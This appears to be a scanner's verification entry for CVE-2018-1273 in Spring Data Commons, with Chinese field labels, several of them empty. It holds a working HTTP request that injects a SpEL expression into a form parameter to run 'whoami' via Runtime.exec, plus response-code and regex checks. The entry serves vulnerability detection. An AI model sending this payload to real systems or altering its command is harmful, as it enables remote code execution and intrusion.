﻿# CVE_2018_1273

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /users HTTP/1.1
Content-type: application/x-www-form-urlencoded

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]
```

> 响应代码特征：500

> 响应内容特征：^(?=.*?(?:Invalid|property)).*?$

> 上传文件定位：

> 验证文件来源：Spring_CVE_2018_1273.poc
